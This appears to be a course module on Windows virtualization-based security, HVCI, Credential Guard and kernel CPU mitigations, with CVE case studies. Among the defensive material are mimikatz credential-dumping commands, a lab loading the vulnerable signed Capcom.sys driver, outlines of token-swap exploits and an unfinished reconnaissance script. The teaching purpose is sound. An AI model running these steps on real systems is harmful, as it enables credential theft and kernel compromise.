## Day 5: Virtualization-Based Security (VBS) and HVCI

- **Goal**: Understand hardware-assisted security through virtualization.
- **Activities**:
  - _Reading_:
    - [VBS Overview](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)
    - [HVCI Documentation](https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity)
  - _Online Resources_:
    - [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
  - _Tool Setup_:
    - Windows 11 Pro/Enterprise with VBS
    - Hyper-V enabled
  - _Exercise_:
    - Enable VBS and HVCI
    - Test kernel code integrity
    - Verify Credential Guard

### Virtualization-Based Security (VBS)

**What is VBS?**:

- Uses hardware virtualization (Hyper-V)
- Creates isolated "Secure World" (VSM - Virtual Secure Mode)
- Normal Windows runs in "Normal World"
- Secure World protected from Normal World

**Architecture**:

```text
┌────────────────────────────────────┐
│         Hardware (CPU)             │
├────────────────────────────────────┤
│    Hyper-V Hypervisor (Ring -1)    │
├─────────────────┬──────────────────┤
│  Normal World   │  Secure World    │
│   (VTL 0)       │    (VTL 1)       │
├─────────────────┼──────────────────┤
│ Windows Kernel  │ Secure Kernel    │
│ Applications    │ Secure Services  │
│ Drivers         │ - Credential     │
│                 │   Guard          │
│                 │ - HVCI           │
│                 │ - Device Guard   │
└─────────────────┴──────────────────┘

Normal World CANNOT access Secure World
Secure World CAN inspect Normal World
Hypervisor enforces isolation
```

**VBS Features**:

1. **Hypervisor-Protected Code Integrity (HVCI)**
   - Validates kernel code signatures
   - Prevents unsigned code execution in kernel

2. **Credential Guard**
   - Isolates credentials (NTLM, Kerberos tickets)
   - Prevents credential theft (mimikatz)

3. **Device Guard**
   - Application whitelisting
   - Only signed apps can run

4. **Kernel Data Protection (KDP)**
   - Protects kernel data structures
   - Read-only enforced by hypervisor

#### Checking VBS Status

**PowerShell**(admin):

```bash
# Check if VBS is capable
Get-ComputerInfo | Select-Object DeviceGuard*

# Check if VBS is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# Output interpretation:
# SecurityServicesRunning is an ARRAY, not a single value:
#   Contains 1 = Credential Guard is running
#   Contains 2 = HVCI (Hypervisor-Enforced Code Integrity) is running
#   Contains 5 = SMM Firmware Measurement
#   Contains 7 = System Guard Secure Launch
#   e.g. {2, 5, 7} = HVCI + SMM + Secure Launch running

# VirtualizationBasedSecurityStatus values:
#   0 = Not enabled
#   1 = Enabled but not running
#   2 = Enabled and running

# DeviceGuardSmartStatus: Off
# Means: Full Device Guard policy not enforced (HVCI can run independently)

# Note: VBS requires nested virtualization support
# May be disabled in VirtualBox VMs or other virtualized environments
```

#### Microsoft Pluton (Hardware-based Security)

Modern Windows 11 devices (Ryzen 6000+, Intel 12th Gen+) may integrate the **Microsoft Pluton** security processor directly into the CPU die, replacing or augmenting the traditional TPM.

```bash
# Check TPM manufacturer (determines if Pluton is present)
Get-CimInstance -Namespace root/cimv2/security/microsofttpm -ClassName Win32_Tpm | Select-Object ManufacturerIdTxt

# Common ManufacturerIdTxt values:
#   "INTC" = Intel fTPM (firmware TPM, no Pluton)
#   "AMD"  = AMD fTPM (no Pluton)
#   "MSFT" = Microsoft Pluton (integrated security processor)
#   "IFX"  = Infineon (discrete TPM chip)
#   "STM"  = STMicroelectronics (discrete TPM chip)

# Advanced Pluton check (only works on Windows 11 22H2+ with Pluton hardware):
Get-ComputerInfo | Select-Object -ExpandProperty CsSecurityProcessorFeatures
# Note: This property only exists on Pluton-enabled systems
# Will error on systems without Pluton or older Windows versions

# Key Benefits of Pluton (when present):
# - Eliminates "Bus Interposer" attacks (listening to traffic between CPU and TPM chip)
# - Provides continuous firmware protection via Windows Update
# - Stores sensitive credentials (BitLocker keys, Windows Hello) inside the CPU package
# - Only available on: AMD Ryzen 6000+, Intel 12th Gen+ (select models), Qualcomm Snapdragon
```

### Hypervisor-Protected Code Integrity (HVCI)

**What is HVCI?**:

- Also called "Memory Integrity"
- Validates all kernel-mode code
- Code must be signed by Microsoft or WHQL
- Enforced by Secure Kernel (VTL 1)

**How HVCI Works**:

Without HVCI:

1. Driver loaded into kernel
2. Kernel sets pages executable
3. Driver code runs
4. Unsigned/malicious driver can run

With HVCI:

1. Driver loaded into kernel
2. Kernel requests executable pages
3. Secure Kernel validates signature
4. If invalid -> request denied
5. Driver cannot execute
6. Only signed drivers run

**HVCI Protection**:

Attack Scenario: Kernel exploit

Without HVCI:

1. Exploit kernel bug
2. Write shellcode to kernel memory
3. Mark pages executable
4. Jump to shellcode
   -> Attacker has kernel code execution

With HVCI:

1. Exploit kernel bug
2. Write shellcode to kernel memory
3. Try to mark pages executable
4. Secure Kernel denies (not signed)
   -> Shellcode cannot execute

**Checking HVCI Status**:

```bash
# CORRECT way to check if HVCI is running:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning

# SecurityServicesRunning interpretation:
#   Contains 2 = HVCI is RUNNING
#   Missing 2  = HVCI is NOT running

# MISLEADING check (ignore this):
Get-ComputerInfo | Select-Object DeviceGuardSmartStatus
# "Off" does NOT mean HVCI is off!
# "Off" means full Device Guard policy is not enforced
# HVCI can run independently without full Device Guard

# Alternative check via Settings UI:
# Windows Security -> Device Security -> Core Isolation -> Memory Integrity
# Should show "On" if HVCI is running
```

**Enabling HVCI** (if not already running):

```bash
# Method 1: Via Windows Settings (easiest)
# Settings -> Privacy & Security -> Windows Security -> Device Security
# -> Core Isolation Details -> Memory Integrity -> Turn On

# Method 2: Via Group Policy
# Computer Configuration -> Administrative Templates -> System -> Device Guard
# Turn On Virtualization Based Security
# Enable Platform Security Level: Secure Boot and DMA Protection
# Enable Virtualization Based Protection of Code Integrity: Enabled with UEFI lock

# Reboot required after any method
shutdown /r /t 0

# IMPORTANT: HVCI Requirements
# - Nested virtualization support (Hyper-V hypervisor)
# - SLAT support (EPT on Intel, RVI on AMD)
# - UEFI firmware (not legacy BIOS)
# - Secure Boot enabled
# - Compatible drivers (unsigned drivers will fail to load)
# - Will NOT work in VirtualBox VMs (no nested Hyper-V support)
# - Use bare metal, Hyper-V, or VMware with nested virtualization enabled
```

#### Real-World Lab: The "BYOVD" Scenario

HVCI blocks _unsigned_ drivers. But what about _signed_ drivers with vulnerabilities?

1. **Preparation**: Download `Capcom.sys` (a notoriously vulnerable, signed driver) or use a dummy file.
2. **Test**:

```bash
# Create service for unsigned driver
sc create BadDriver binPath=C:\Windows_Mitigations_Lab\bin\Unsigned.sys type=kernel
sc start BadDriver
# Result: BLOCKED by HVCI

# Create service for Signed Vulnerable Driver (e.g., Capcom)
sc create VulnSigned binPath=C:\Windows_Mitigations_Lab\bin\Capcom.sys type=kernel
sc start VulnSigned
# Result: ALLOWED by HVCI (Signature is valid!)
```

**Key Takeaway**: HVCI ensures code _integrity_, not code _quality_. Attackers bypass HVCI by bringing valid, signed drivers with known bugs to load into the kernel.

### Credential Guard

**What is Credential Guard?**:

- Isolates secrets in VTL 1
- Prevents credential theft attacks
- Defeats mimikatz and similar tools

**Protected Credentials**:

- NTLM password hashes
- Kerberos TGT tickets
- Domain credentials
- Credential Manager secrets

**Attack Without Credential Guard**:

```bash
# Attacker runs mimikatz on compromised machine
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Output:
# * Username: admin
# * NTLM: 5f4dcc3b5aa765d61d8327deb882cf99
# -> Attacker has password hash, can Pass-the-Hash
```

**Attack With Credential Guard**:

```bash
# Attacker runs mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Output:
# * Username: admin
# * NTLM: (null)  ← Credential Guard blocked access!
```

**Enabling Credential Guard**:

```powershell
# IMPORTANT: Credential Guard Requirements
# - Windows 11 Enterprise or Windows 11 Education
# - Windows 10 Enterprise or Windows 10 Education
# - Windows Server 2016+ (Datacenter/Standard)
# NOT available on Windows Pro or Home editions!

# Check your Windows edition:
Get-ComputerInfo | Select-Object WindowsProductName, WindowsEditionId

# Enable via Group Policy (Enterprise/Education only):
# Computer Configuration -> Administrative Templates -> System -> Device Guard
# -> Turn On Virtualization Based Security
# -> Credential Guard Configuration: Enabled with UEFI lock

# Enable via Registry (if supported edition):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 1 /f

# Reboot required
shutdown /r /t 0

# Verify after reboot:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning
# Should include 1 (Credential Guard)
# If "1" is missing, check:
#   1. Windows edition (must be Enterprise/Education)
#   2. VBS is running (VirtualizationBasedSecurityStatus should be 2)
#   3. Event Viewer: Applications and Services Logs -> Microsoft -> Windows -> DeviceGuard
```

### Kernel Data Protection (KDP)

> [!IMPORTANT]
> **KDP is opt-in, not automatic.** Drivers must explicitly call
> `MmProtectDriverSection()` to register data for hypervisor protection.
> Critical structures like `EPROCESS.Token` are NOT KDP-protected by default.

**What is KDP?**:

- Protects specific kernel data structures from modification
- Enforced by hypervisor (VTL 1)
- Drivers must **opt in** by calling `MmProtectDriverSection()`
- Not a blanket protection — only data explicitly registered is guarded

**How KDP Works**:

KDP is NOT automatic for all kernel structures. Drivers register specific
data sections as read-only, and the hypervisor enforces immutability.

```c
// Driver opts into KDP protection:
NTSTATUS DriverEntry(...) {
    // Mark a section as hypervisor-protected read-only
    MmProtectDriverSection(SectionHandle, /* ... */);
    // Now: any write to this section from VTL 0 -> bugcheck
}
```

**What KDP Protects** (when opted in):

- Driver-specific configuration data
- Security policy structures
- Function pointer tables (driver dispatch routines)
- Any data a driver explicitly registers

**What KDP Does NOT Protect**:

- EPROCESS.Token (this is NOT KDP-protected by default)
- Arbitrary kernel heap allocations
- Data that hasn't been explicitly registered
- Process/thread structures (unless a driver registers them)

> [!WARNING]
> A common misconception is that KDP protects `EPROCESS.Token` from
> token-swapping attacks. It does NOT — unless a specific driver opts in.
> Real-world kernel exploits (CVE-2024-21338, CVE-2023-28252) successfully
> overwrite tokens because EPROCESS is not KDP-protected. The actual
> defense against token swapping requires broader VBS features like
> Secure Kernel address space isolation.

**KDP in Action**:

Attack: Privilege escalation via token swap

1. Attacker has kernel r/w primitive
2. Find SYSTEM process EPROCESS
3. Copy SYSTEM token to attacker process
4. Without VBS: Success, attacker is SYSTEM
5. With VBS (but without KDP on tokens): Still succeeds!
6. With KDP on the specific structure: Hypervisor blocks write -> BSOD

### VBS Attack Surface Analysis

**What VBS Protects Against**:

- Kernel-mode code injection
- Credential theft from LSASS
- Unsigned driver loading
- Direct kernel object manipulation

**What VBS Does NOT Protect Against**:

- Hypervisor vulnerabilities (Hyper-V bugs)
- Hardware attacks (DMA, cold boot)
- Signed malicious drivers (supply chain)
- Data-only attacks in kernel
- User-mode exploitation
- Firmware/UEFI attacks

**Notable VBS/HVCI Bypasses**:

**CVE-2022-21894** (Secure Boot Bypass):

- BlackLotus UEFI bootkit
- Bypassed Secure Boot to disable VBS
- Required physical access or admin rights
- Patched but demonstrates VBS isn't invincible

### CVE Case Studies

Real-world examples of mitigation bypasses and failures:

#### CVE-2024-21338: Windows Kernel Elevation of Privilege

**Date**: February 2024
**Impact**: Local privilege escalation to SYSTEM
**Mitigations Present but Ineffective**: HVCI, VBS

**Technical Details**:

```text
Vulnerability: Logic bug in appid.sys (AppLocker driver)
Exploit Chain:
1. Create malicious ALPC port
2. Trigger vulnerable IOCTL in appid.sys
3. Achieve arbitrary kernel read/write
4. Overwrite process token (NOT protected by KDP — Token is not opted in)
5. Escalate to SYSTEM

Key Insight: Logic bugs bypass memory corruption mitigations
HVCI doesn't help because no unsigned code execution needed
KDP doesn't help because EPROCESS.Token is not KDP-registered
This is a DATA-ONLY attack — same category proven effective in Day 2
```

**Lesson**: HVCI protects code integrity, not data integrity. KDP only protects data that drivers explicitly register. Logic bugs and data-only attacks remain the primary kernel exploitation technique.

#### CVE-2024-30088: Windows Kernel TOCTOU (Authz)

**Date**: June 2024
**Impact**: Local privilege escalation
**Mitigations Challenged**: KASLR, SMEP, CFG

**Technical Details**:

```text
Vulnerability: Race condition in AuthzBasepCopyoutInternalSecurityAttributes
Exploit Technique:
1. Create a large set of security attributes
2. Trigger the copy operation in the kernel
3. Rapidly change the attribute size in a separate thread (TOCTOU)
4. Causes an out-of-bounds copy into the kernel heap
5. Gain arbitrary kernel read/write primitive via heap corruption

Mitigations Present:
- KASLR: Required info leak to find kernel base
- CFG: Challenged but bypassable via data-only primitives
- SMEP: Not relevant (no user-mode code execution)
```

**Lesson**: Race conditions (TOCTOU) remain one of the most reliable ways to bypass static checks in the kernel.

#### CVE-2023-36802: Microsoft Streaming Service Proxy EoP

**Date**: September 2023 (Exploited in the wild)
**Impact**: SYSTEM privileges from any user
**Attack Vector**: Used by commercial spyware

**Technical Details**:

```text
Vulnerability: Type confusion in mskssrv.sys

Exploit:
1. Open handle to vulnerable device
2. Send crafted IOCTL causing type confusion
3. Confused object allows arbitrary memory access
4. Overwrite security token
5. Spawn SYSTEM shell

Notable: Exploited before patch available (0-day)
Used in targeted attacks against specific individuals
```

**Lesson**: Driver attack surface remains large; 0-days actively exploited.

#### CVE-2023-28252: Windows CLFS Driver EoP

**Date**: April 2023 (Exploited by Nokoyawa ransomware)
**Impact**: SYSTEM from any user
**Mitigations Status**: All standard mitigations enabled

**Technical Details**:

```text
Vulnerability: Out-of-bounds write in CLFS.sys

Exploit Path:
1. Create malicious CLFS log file
2. Trigger parsing vulnerability
3. Corrupt kernel pool metadata
4. Achieve write-what-where primitive
5. Overwrite process token

Ransomware Usage:
- Nokoyawa used this to escalate privileges
- Combined with other techniques for full compromise
- Demonstrates real-world impact of kernel bugs
```

**Lesson**: Ransomware groups actively exploit kernel vulnerabilities.

#### CVE-2023-21768: Windows Ancillary Function Driver (AFD) EoP

**Date**: January 2023
**Impact**: SYSTEM privileges
**Interesting Aspect**: CFG bypass technique

**Technical Details**:

```text
Vulnerability: Memory corruption in afd.sys

CFG Bypass Technique Used:
1. Corrupt function pointer to point to valid CFG target
2. Use VirtualProtect (valid target) to make shellcode executable
3. Chain: corrupt ptr -> VirtualProtect -> shellcode

This demonstrates:
- CFG doesn't stop corruption, only validates targets
- VirtualProtect is a useful target for attackers
- ACG would have prevented this specific bypass
```

**Lesson**: CFG's granularity allows certain bypass patterns.

### Mitigation Effectiveness Timeline

How mitigations have evolved against real attacks:

```
2004: DEP introduced (XP SP2)
      ↓ Attackers develop ROP

2007: ASLR introduced (Vista)
      ↓ Attackers use info leaks

2015: CFG introduced (Win 8.1 Update 3)
      ↓ Attackers abuse valid targets

2018: CET announced (Hardware support later)
      ↓ Attackers pivot to data-only attacks

2020: VBS/HVCI mainstream (Win 10 2004)
      ↓ Attackers focus on logic bugs, signed drivers

2023-2024: Most in-the-wild exploits are:
      - Logic bugs (not memory corruption)
      - Signed driver abuse
      - Data-only attacks
      - Browser renderer escapes + kernel bugs
```

#### What Attackers Target Now

With comprehensive mitigations, attackers focus on:

**1. Logic Bugs**:

- No memory corruption needed
- Mitigations don't apply
- Examples: Permission checks, race conditions

**2. Signed Driver Abuse**:

- BYOVD (Bring Your Own Vulnerable Driver)
- Legitimate but vulnerable drivers
- HVCI allows signed code

**3. Supply Chain**:

- Compromise build process
- Backdoor signed updates
- Trusted code becomes malicious

**4. Browser + Kernel Chains**:

- Renderer escape (V8, WebKit bug)
- Sandbox escape
- Kernel privilege escalation
- Multiple bugs chained together

**5. Physical/Firmware Attacks**:

- DMA attacks
- UEFI implants
- Evil Maid scenarios

#### Kernel-Level CPU Mitigations

Beyond VBS/HVCI, modern Windows employs several CPU-level mitigations to protect the kernel.

##### SMEP (Supervisor Mode Execution Prevention)

**What is SMEP?**:

- CPU feature preventing kernel from executing user-mode pages
- Defeats classic kernel exploitation technique
- Available since Intel Ivy Bridge (2012) / Haswell (2013), AMD Bulldozer
- Enabled by default on Windows 8+

**The Attack SMEP Prevents**:

```text
Classic Kernel Exploit (Pre-SMEP):
---------------------------------------------------------------

1. Attacker allocates shellcode in user mode (Ring 3)
2. Triggers kernel vulnerability
3. Overwrites kernel function pointer -> user mode shellcode
4. Kernel (Ring 0) executes attacker's user mode code
5. Shellcode runs with kernel privileges!

User Mode                    Kernel Mode
┌─────────────────┐         ┌─────────────────┐
│ Shellcode       │◄────────│ Corrupted ptr   │
│ at 0x41410000   │  JUMP   │ -> 0x41410000   │
│ (Ring 3 memory) │         │                 │
└─────────────────┘         └─────────────────┘
     ▲
     │
   SMEP BLOCKS THIS!
```

**With SMEP Enabled**:

1. Attacker corrupts kernel pointer -> user mode address
2. Kernel tries to execute user mode page
3. CPU checks: "Am I in Ring 0 executing Ring 3 page?"
4. SMEP: YES -> #PF (Page Fault) -> BSOD
5. Attack fails, system crashes (DoS, not code execution)

**Checking SMEP Status**:

```bash
# Check CPU support
Get-CimInstance Win32_Processor | Select-Object Name
# Most CPUs since 2012 support SMEP

# Check if enabled (via CR4 register bit 20)
# In kernel debugger:
windbg -k net:port=50000,key=1.2.3.4

r cr4
# If bit 20 (0x100000) is set -> SMEP enabled

# Or use !cpuinfo
!cpuinfo
# Look for SMEP in features
```

**WinDbg Lab: Observing SMEP**:

```bash
# In kernel debugger:

# 1. Check CR4 register
r cr4
# Example: cr4=00000000001506f8
# Binary: ...0001 0101 0000 0110 1111 1000
#              ↑
#            Bit 20 = SMEP

# 2. Manually check bit
.formats cr4
? cr4 & 0x100000
# Non-zero = SMEP enabled

# 3. What happens with SMEP violation:
# BugCheck: KERNEL_MODE_EXCEPTION_NOT_HANDLED
# Or: PAGE_FAULT_IN_NONPAGED_AREA
```

##### SMAP (Supervisor Mode Access Prevention)

**What is SMAP?**:

- Prevents kernel from **reading/writing** user mode pages
- Complements SMEP (which only blocks execute)
- Available since Intel Broadwell (2014), AMD Zen
- Windows 10 1809+ enables by default

**The Attack SMAP Prevents**:

```text
Kernel Data Attack (Pre-SMAP):
-------------------------------------------------------------

Scenario: Kernel reads data from user-controlled pointer

void kernel_function(void *user_ptr) {
    // Kernel reads from user-supplied address
    struct config *cfg = (struct config *)user_ptr;
    if (cfg->admin_flag) {  // Attacker controls this memory!
        grant_admin();
    }
}

Attack:
1. Attacker sets up fake struct at user mode address
2. Attacker->admin_flag = 1
3. Kernel reads fake data, grants admin

With SMAP:
- Kernel cannot read user memory directly
- Must use copy_from_user() or probe functions
- Direct access causes #PF -> BSOD
```

**STAC/CLAC Instructions**:

```asm
; SMAP can be temporarily disabled for legitimate kernel operations
; Using STAC (Set AC flag) and CLAC (Clear AC flag)

; Kernel needs to copy from user mode:
stac                    ; Temporarily allow user access
mov rax, [user_ptr]     ; Now works
clac                    ; Re-enable SMAP protection
```

**Checking SMAP Status**:

```bash
# CR4 bit 21 = SMAP
r cr4
? cr4 & 0x200000
# Non-zero = SMAP enabled

# Or check EFLAGS AC bit during suspicious access
r efl
# AC flag (bit 18) set = SMAP temporarily disabled
```

##### KPTI / KVA Shadow (Meltdown Mitigation)

**What is KPTI?**:

- Kernel Page Table Isolation (Linux term)
- Windows calls it "KVA Shadow" (Kernel Virtual Address Shadow)
- Mitigates Meltdown vulnerability (CVE-2017-5754)
- Separates user and kernel page tables

**The Meltdown Attack**:

```text
Meltdown (CVE-2017-5754):
--------------------------------------------------------------

CPU Vulnerability: Speculative execution reads kernel memory

1. User mode code speculatively accesses kernel address
2. CPU eventually raises exception (access denied)
3. BUT: Before exception, data was loaded into cache
4. Side-channel attack reads data from cache
5. User mode leaks kernel memory!

Simplified:
a) char *kernel_addr = 0xFFFFF800...;  // Kernel address
b) char data = *kernel_addr;            // Speculative load
c) char probe = array[data * 4096];     // Encode in cache
d) Measure which array page is cached   // Leak 'data'
```

**How KVA Shadow Works**:

```text
Without KVA Shadow:
---------------------------------------------------------------------

Single Page Table for process:
┌─────────────────────────────────────────┐
│ User Space Mappings                     │  ← User code can access
├─────────────────────────────────────────┤
│ Kernel Space Mappings                   │  ← Visible but protected
│ (ntoskrnl, drivers, kernel data)        │     (Meltdown leaks this!)
└─────────────────────────────────────────┘


With KVA Shadow:
---------------------------------------------------------------------

User Mode (CR3 -> Shadow Table):    Kernel Mode (CR3 -> Full Table):
┌────────────────────────────┐    ┌─────────────────────────────────┐
│ User Space Mappings        │    │ User Space Mappings             │
├────────────────────────────┤    ├─────────────────────────────────┤
│ Minimal Kernel (trampoline)│    │ Full Kernel Mappings            │
│ Only entry/exit code       │    │ All drivers, data, etc.         │
└────────────────────────────┘    └─────────────────────────────────┘

On syscall: Switch CR3 to full table
On return:  Switch CR3 to shadow table
```

**Checking KVA Shadow Status**:

```bash
# PowerShell - Check Meltdown mitigation
Get-SpeculationControlSettings

# Look for:
# KVAShadowRequired: True/False
# KVAShadowWindowsSupportEnabled: True
# KVAShadowPcidEnabled: True (performance optimization)

# Registry check
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name FeatureSettingsOverride*
```

**Performance Impact**:

```text
KVA Shadow Performance Overhead:
-----------------------------------------------------------
Without PCID:    15-30% slowdown (syscall heavy workloads)
With PCID:       2-5% slowdown
PCID = Process Context Identifiers (TLB optimization)

Most modern CPUs support PCID, minimizing impact.
I/O intensive workloads affected more than compute.
```

##### Retpoline (Spectre v2 Mitigation)

**What is Retpoline?**:

- "Return Trampoline" - software mitigation for Spectre v2
- Replaces indirect branches with return-based sequences
- Prevents speculative execution of attacker-chosen targets

**The Spectre v2 Attack**:

1. Attacker trains branch predictor with malicious target
2. Victim executes indirect branch (jmp [rax])
3. CPU speculates to attacker-trained address
4. Speculative execution accesses secret data
5. Side-channel leaks the data

**How Retpoline Works**:

```asm
; Original vulnerable code:
jmp [rax]           ; Indirect jump - branch predictor vulnerable

; Retpoline replacement (simplified / conceptual):
call retpoline_rax  ; Use call/ret instead

retpoline_rax:
    lea rsp, [rsp-8]      ; Make room on stack
    mov [rsp], rax        ; Store target
    call .setup           ; Push return address
.loop:
    pause                 ; Spin (never actually executes)
    jmp .loop
.setup:
    mov [rsp+8], rax      ; Set up return target
    ret                   ; Return to target (not predicted)

; NOTE: Real retpoline implementations (e.g., Google's, Linux kernel)
; use `lfence` and different stack manipulation. This is a simplified
; illustration of the core concept.

; Why it works:
; - Returns are predicted differently than jumps
; - Speculation goes to .loop (harmless)
; - Actual execution goes to correct target
```

**Checking Retpoline/Spectre Status**:

```bash
# PowerShell - Full speculation control check
Get-SpeculationControlSettings

# Important fields:
# BTIHardwarePresent: CPU has hardware fix (IBRS/IBPB)
# BTIWindowsSupportEnabled: Windows mitigation active
# BTIWindowsSupportPresent: Windows supports mitigation
# BTIDisabledBySystemPolicy: Admin disabled it

# For servers with many syscalls, consider:
# - Hardware mitigations (newer CPUs)
# - Performance vs security tradeoff
```

**Speculation Control Settings Script**:

```bash
# Comprehensive speculation control audit
function Get-FullSpeculationStatus {
    $settings = Get-SpeculationControlSettings

    Write-Host "=== Meltdown (KVA Shadow) ===" -ForegroundColor Cyan
    Write-Host "Required: $($settings.KVAShadowRequired)"
    Write-Host "Enabled:  $($settings.KVAShadowWindowsSupportEnabled)"
    Write-Host "PCID:     $($settings.KVAShadowPcidEnabled)"

    Write-Host "`n=== Spectre v1 ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.SSBDHardwarePresent)"

    Write-Host "`n=== Spectre v2 (BTI) ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.BTIHardwarePresent)"
    Write-Host "Enabled:  $($settings.BTIWindowsSupportEnabled)"

    Write-Host "`n=== L1TF ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.L1TFHardwarePresent)"
    Write-Host "Enabled:  $($settings.L1TFWindowsSupportEnabled)"

    Write-Host "`n=== MDS ===" -ForegroundColor Cyan
    Write-Host "Hardware: $($settings.MDSHardwarePresent)"
    Write-Host "Enabled:  $($settings.MDSWindowsSupportEnabled)"
}

Get-FullSpeculationStatus
```

##### Kernel CFG (kCFG)

**What is Kernel CFG?**:

- CFG protection extended to kernel mode
- Validates indirect calls in kernel code
- Part of HVCI enforcement

**kCFG Architecture**:

```text
User Mode CFG:         Kernel Mode CFG (kCFG):
┌──────────────────┐  ┌──────────────────────────┐
│ Process bitmap   │  │ System-wide bitmap       │
│ Per-process      │  │ Loaded at boot           │
│ User DLLs only   │  │ All drivers validated    │
│ Software check   │  │ HVCI enforced            │
└──────────────────┘  └──────────────────────────┘
```

**Checking kCFG Status**:

```bash
# In kernel debugger:
!analyze -show CFG

# Check if driver is kCFG enabled:
!dh <driver_base> -f
# Look for IMAGE_GUARD_CF_INSTRUMENTED
```

#### Smart App Control (Windows 11 22H2+)

**What is Smart App Control?**:

- AI-powered application reputation system
- Blocks untrusted/unknown applications
- Only available on clean Windows 11 installs
- Cannot be re-enabled once disabled

**How It Works**:

1. App attempts to run
2. Microsoft cloud checks reputation
3. Known good -> Allow
4. Known bad -> Block
5. Unknown -> Block (in Enforcement mode)

**Modes**:

- **Evaluation**: Learning mode, monitors but doesn't block
- **Enforcement**: Actively blocks untrusted apps
- **Off**: Disabled (cannot re-enable)

**Checking Status**:

```bash
# Via Windows Security app
# Or registry:
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState"
```

**Impact on Exploitation**:

- Blocks unknown/unsigned executables
- Prevents running custom tools (initially)
- Attackers must use LOLBins or signed tools
- Significantly raises bar for initial access

#### Windows Defender Application Control (WDAC)

**What is WDAC?**:

- Enterprise-grade application whitelisting
- Kernel-enforced code integrity
- Replaces AppLocker for high-security scenarios
- Uses Code Integrity policies (.p7b files)

**WDAC vs AppLocker**:

| Feature           | AppLocker    | WDAC         |
| ----------------- | ------------ | ------------ |
| Enforcement       | User-mode    | Kernel-mode  |
| Bypass difficulty | Medium       | Hard         |
| Configuration     | GPO rules    | CI Policies  |
| DLL blocking      | Limited      | Full support |
| Driver blocking   | No           | Yes          |
| Managed installer | No           | Yes          |
| Performance       | Low overhead | Low overhead |

**WDAC Policy Creation**:

```bash
# Create base policy from system scan
New-CIPolicy -ScanPath "C:\Windows" `
    -Level Publisher `
    -UserPEs `
    -FilePath "BasePolicy.xml"

# Add trusted publisher
Add-SignerRule -FilePath "BasePolicy.xml" `
    -CertificatePath "trusted.cer" `
    -Kernel -User

# Merge policies
Merge-CIPolicy -PolicyPaths @("BasePolicy.xml", "CustomRules.xml") `
    -OutputFilePath "MergedPolicy.xml"

# Convert to binary
ConvertFrom-CIPolicy "MergedPolicy.xml" "Policy.p7b"

# Deploy (requires admin)
Copy-Item "Policy.p7b" "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
# Reboot required for enforcement
```

**WDAC Enforcement Levels**:

```text
File Rule Levels (most to least restrictive):
------------------------------------------------------------

Hash            - Exact file hash only
FileName        - Original filename + version
FilePublisher   - Publisher + product + filename + version
Publisher       - Publisher signature only
SignedVersion   - Any signed version of product
PcaCertificate  - Certificate chain validation
LeafCertificate - End certificate only
WHQLPublisher   - Microsoft WHQL signed
WHQLFilePublisher - WHQL + filename
```

**Checking WDAC Status**:

```bash
# Check if WDAC policy is active
Get-CimInstance -ClassName Win32_DeviceGuard `
    -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object UsermodeCodeIntegrityPolicyEnforcementStatus

# Values:
# 0 = Off
# 1 = Audit mode
# 2 = Enforced

# View active policy
citool.exe -lp

# Check specific binary authorization
Get-AuthenticodeSignature "C:\path\to\binary.exe"
```

**WDAC Audit Mode Analysis**:

```bash
# Enable audit mode in policy
Set-RuleOption -FilePath "Policy.xml" -Option 3  # Audit mode

# After deployment, check event log
Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" |
    Where-Object {$_.Id -eq 3076} |  # Audit block events
    Select-Object TimeCreated, Message

# Event ID Reference:
# 3076 - Would have been blocked (audit)
# 3077 - Blocked (enforcement)
# 3089 - Signing info for blocked file
```

### Practical Exercise

#### VBS/HVCI Status Probe

```python
#!/usr/bin/env python3
"""
vbs_hvci_probe.py — Probe VBS and HVCI status via WMI and registry
Demonstrates: Detecting active mitigations before exploitation.

Real-world attackers check VBS/HVCI status early in the kill chain.
If HVCI is on, kernel shellcode attacks are futile — pivot to data-only.
If Credential Guard is on, mimikatz credential dumping fails — pivot to
Kerberos delegation or phishing for tokens.

Requirements: Run on Windows as Administrator (for WMI queries)
Usage: python vbs_hvci_probe.py
"""
import subprocess
import json
import sys
import os

def run_ps(command):
    """Run a PowerShell command and return stdout."""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", command],
            capture_output=True, text=True, timeout=30
        )
        return result.stdout.strip(), result.returncode
    except Exception as e:
        return str(e), -1

def check_vbs_status():
    """Query VBS status via WMI (Win32_DeviceGuard)."""
    print("\n" + "=" * 65)
    print("  VBS (Virtualization-Based Security) Status")
    print("=" * 65)

    query = (
        "Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard | "
        "Select-Object -Property VirtualizationBasedSecurityStatus, "
        "SecurityServicesConfigured, SecurityServicesRunning, "
        "RequiredSecurityProperties, AvailableSecurityProperties | "
        "ConvertTo-Json"
    )
    output, rc = run_ps(query)

    if rc != 0 or not output:
        print("  [!] Could not query WMI — need Administrator privileges")
        return {}

    try:
        data = json.loads(output)
